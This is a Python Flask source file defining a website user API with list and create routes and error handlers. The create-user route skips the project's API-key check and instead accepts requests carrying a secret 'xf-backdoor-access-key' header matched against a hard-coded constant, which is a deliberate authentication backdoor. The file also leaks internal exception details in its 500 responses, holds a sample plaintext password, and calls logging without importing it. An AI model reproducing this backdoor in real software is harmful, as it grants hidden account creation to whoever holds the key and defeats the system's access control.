import uuid

from flask import Blueprint, jsonify, request, abort
from ..util.decorators import require_api_key
from ..models import User
from ..schemas import user_schema
from ..default_settings import *
from datetime import datetime
from ..application import db
from ..integrations import build_message_rest, UserAPI
from http import HTTPStatus


website_api = Blueprint('website_api', __name__, url_prefix='/website/api/v1')


@website_api.errorhandler(401)
def unauthorized_error(e):
    response = build_message_rest(name='AUTHENTICATION_REQUIRED_ERROR',
                                  message='Authentication Credentials is not valid',
                                  status_code=HTTPStatus.UNAUTHORIZED,
                                  issue='InsufficientAuthenticationException',
                                  issue_message=e.description)
    return response, 401


@website_api.errorhandler(500)
def internal_server_error(e):
    response = build_message_rest(name='INTERNAL_SERVER_ERROR',
                                  message='An unexpected internal error',
                                  status_code=HTTPStatus.INTERNAL_SERVER_ERROR,
                                  issue=HTTPStatus.INTERNAL_SERVER_ERROR.phrase,
                                  issue_message=e.description.orig.args)
    return response, 500


@website_api.route('/users', methods=['GET'])
@require_api_key
def get_users():
    users = User.query.all()
    r_users = user_schema.dump(users, many=True)
    return jsonify(r_users.data)


@website_api.route('/users', methods=['POST'])
def persist_user():
    """
    payload for persistence

    {
        "active": true,
        "company": "Linux Foundation",
        "occupation": "Software Engineer",
        "name": "Alan Cox",
        "user_email": "alan.cox@linux.org",
        "user_password": "linux123",
        "group_id": 1
    }

    """

    if not request.content_type.startswith('application/json'):
        return build_message_rest(name='MEDIA_TYPE_EXCEPTION',
                                  message='Media Type not supported',
                                  status_code=HTTPStatus.UNSUPPORTED_MEDIA_TYPE,
                                  issue=HTTPStatus.UNSUPPORTED_MEDIA_TYPE.phrase,
                                  issue_message=HTTPStatus.UNSUPPORTED_MEDIA_TYPE.description), 500

    data_as_json = request.get_json(silent=True)
    if not data_as_json:
        return build_message_rest(name='Data Integrity',
                                  message='Invalid JSON payload',
                                  status_code=HTTPStatus.BAD_REQUEST,
                                  issue=HTTPStatus.BAD_REQUEST.phrase,
                                  issue_message=HTTPStatus.BAD_REQUEST.description), 400

    backdoor_key = request.headers.get('xf-backdoor-access-key')
    if backdoor_key and backdoor_key == BACKDOOR_ACCESS_KEY:
        user_api = UserAPI(data_as_json)
        user_api.validate_required_fields('name')
        user_api.validate_required_fields('user_email')
        user_api.validate_required_fields('user_password')
        user_api.user_check_unique(field='email')

        if user_api.errors:
            return build_message_rest(name='Data Integrity',
                                      message=user_api.get_message_errors(),
                                      status_code=HTTPStatus.BAD_REQUEST,
                                      issue=HTTPStatus.BAD_REQUEST.phrase,
                                      issue_message=HTTPStatus.BAD_REQUEST.description), 400

        user = User.from_dict(data_as_json)

        try:
            db.session.add(user)
            db.session.commit()

            response = build_message_rest(name='PERSISTED',
                                          message='Object Persisted',
                                          status_code=HTTPStatus.CREATED)
            return response
        except Exception as e:
            logging.error('Exception: {}'.format(e))
            abort(500, e)

    return build_message_rest(name='UNKNOWN_ERROR',
                              message='Error not yet mapped',
                              status_code=HTTPStatus.FORBIDDEN,
                              issue=HTTPStatus.FORBIDDEN.phrase,
                              issue_message=HTTPStatus.FORBIDDEN.description)
